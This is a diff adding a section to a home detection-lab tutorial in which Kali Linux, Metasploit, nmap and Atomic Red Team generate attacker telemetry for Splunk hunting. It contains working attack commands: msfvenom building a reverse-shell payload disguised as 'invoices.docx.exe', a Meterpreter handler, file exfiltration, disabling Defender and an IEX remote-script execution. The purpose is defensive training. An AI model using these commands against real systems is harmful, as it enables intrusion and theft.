@@ -1180,3 +1180,222 @@ Your Splunk SIEM is now receiving **full perimeter, endpoint, and network teleme
 * C2 traffic analysis
 * Atomic Red Team tests
 * Detection engineering & correlation
+
+# Part 7 - Kali Linux Attack Simulation & Atomic Red Team Telemetry
+
+This section demonstrates generating attacker telemetry for the detection lab using **Kali Linux**, **Metasploit**, **custom malware**, **Nmap scanning**, and **Atomic Red Team**. All activity is safely contained inside the virtual lab to build detection, enrichment, and hunting skills inside Splunk.
+
+## 1. Deploying Kali Linux
+
+Download Kali VM:
+
+- https://kali.org → Download → Virtual Machines  
+  (Choose VMware or VirtualBox)
+
+Open the `.vmx` file and remove any extra network adapters to avoid conflicts.
+
+Log in with default credentials:
+
+```
+username: kali
+password: kali
+```
+
+Check current IP:
+
+```bash
+ip a
+```
+
+If Kali receives a `192.168.136.x` NAT address, switch to a static address on the lab network.
+
+## 2. Assigning a Static IP to Kali Linux
+
+Navigate to:
+
+```
+Settings → Advanced Network Configuration → Wired → IPv4
+```
+
+Configure:
+
+* **Address:** `192.168.1.250`
+* **Netmask:** `255.255.255.0`
+* **Gateway:** `192.168.1.1` (PFsense)
+* **DNS:** `192.168.1.1`
+
+Refresh the interface by simply toggling your connection from off to on.
+
+Verify:
+
+```bash
+ip a
+ping 192.168.1.20   # Splunk Server
+```
+
+## 3. Generating a Reverse Shell Malware (Msfvenom)
+
+Create a simple Windows payload:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+LHOST=192.168.1.250 LPORT=4444 \
+-f exe -o invoices.docx.exe
+```
+
+Verify file type:
+
+```bash
+file invoices.docx.exe
+```
+
+## 4. Setting Up the Metasploit Handler
+
+Start Metasploit:
+
+```bash
+msfconsole
+```
+
+Configure the handler:
+
+```bash
+use exploit/multi/handler
+set LHOST 192.168.1.250
+set LPORT 4444
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+exploit
+```
+
+This opens the listener waiting for Windows to execute the payload.
+
+## 5. Hosting Malware via HTTP Server
+
+Start a simple Python web server:
+
+```bash
+python3 -m http.server 9999
+```
+
+From **Windows 10**, browse to:
+
+```
+http://192.168.1.250:9999
+```
+
+Download `invoices.docx.exe`.
+
+> Disable Windows Defender temporarily (lab-only) to allow execution.
+
+After execution, Metasploit receives a Meterpreter session:
+
+```bash
+meterpreter > help
+meterpreter > ps
+meterpreter > ls
+```
+
+You may download files back to Kali, e.g.:
+
+```bash
+download Sysmon.zip
+```
+
+Telemetry is now flowing into Splunk.
+
+## 6. Generating Network Noise with Nmap
+
+Run a noisy scan across the entire lab network:
+
+```bash
+nmap -A 192.168.1.0/24
+```
+
+This produces large volumes of IDS and firewall alerts (Zeek, Suricata, PFsense).
+
+Review in Splunk:
+
+```spl
+index=mydfir-detect src=192.168.1.250
+```
+
+## 7. Installing Atomic Red Team (ATT&CK Techniques)
+
+Navigate to:
+
+```
+https://github.com/redcanaryco/atomic-red-team/wiki
+```
+
+Install framework (Windows 10, PowerShell as Admin):
+
+```powershell
+Set-ExecutionPolicy Bypass -Scope LocalMachine
+```
+
+Download and install Invoke-AtomicRedTeam:
+
+```powershell
+IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
+Install-AtomicRedTeam -getAtomics
+```
+
+Test an ATT&CK technique:
+
+```powershell
+Invoke-AtomicTest T1136.001 -Verbose
+```
+
+This generates a **local user account creation** event, allowing validation of:
+
+* Event ID 4688 (process creation)
+* Event ID 4720 (account creation)
+* Sysmon Event ID 1
+
+Search in Splunk:
+
+```spl
+index=mydfir-detect "NewLocalUser"
+```
+
+## 8. Splunk Hunting Examples
+
+**Identify ports scanned by Kali:**
+
+```spl
+index=mydfir-detect src=192.168.1.250
+| stats count by id.resp_p
+```
+
+**Count destination hosts scanned:**
+
+```spl
+index=mydfir-detect src=192.168.1.250
+| stats dc(id.resp_p) count by id.resp_h
+```
+
+This highlights the breadth of Nmap scanning across the network.
+
+## 9. Final Detection Lab Topology
+
+| Component              | IP Address    | Status                 |
+| ---------------------- | ------------- | ---------------------- |
+| PFsense Firewall       | 192.168.1.1   | ✔ Logs forwarded       |
+| Splunk Enterprise      | 192.168.1.20  | ✔ SIEM ingest          |
+| Active Directory DC    | 192.168.1.10  | ✔ WinEvent & Sysmon    |
+| Windows 10 Endpoint    | 192.168.1.100 | ✔ Sysmon, GPO logging  |
+| Zeek + Suricata Sensor | 192.168.1.30  | ✔ JSON logs            |
+| Kali Linux             | 192.168.1.250 | ✔ Adversary Simulation |
+
+## 10. Final Notes
+
+This completes the full detection engineering pipeline:
+
+* Built SIEM ingestion across firewall, endpoint, domain controller, and IDS
+* Deployed Zeek & Suricata
+* Forwarded all telemetry to Splunk
+* Simulated attacker behavior with Kali Linux
+* Ran Atomic Red Team techniques for structured ATT&CK mapping
+* Performed threat hunting inside Splunk
+
+Your environment now mirrors a small/medium enterprise detection stack—ideal for SOC analysis, threat hunting, detection engineering, and IR training.
